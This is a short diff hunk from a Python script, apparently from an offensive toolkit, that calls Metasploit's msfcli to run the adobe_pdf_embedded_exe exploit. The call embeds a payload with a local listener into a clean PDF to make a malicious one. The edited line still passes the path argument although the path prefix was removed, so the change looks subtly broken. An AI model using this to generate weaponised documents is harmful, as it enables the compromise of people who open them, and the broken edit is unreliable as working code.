@@ -75,7 +75,7 @@ while 1:
 		execute = "E"
 
 		# start windows/fileformat/adobe_pdf_embedded_exe exploit with msfcli
-		subprocess.Popen("%s/msfcli %s %s %s %s %s %s %s" % (msfpath(), exploit, payload, localhost, listenport, goodpdf, badpdf, execute), shell=True).wait()
+		subprocess.Popen("msfcli %s %s %s %s %s %s %s" % (msfpath(), exploit, payload, localhost, listenport, goodpdf, badpdf, execute), shell=True).wait()
 		
 		# moves file from ~/.msf4/local/ to /tmp 
 		# still need to figure out how to get filename sent to /tmp
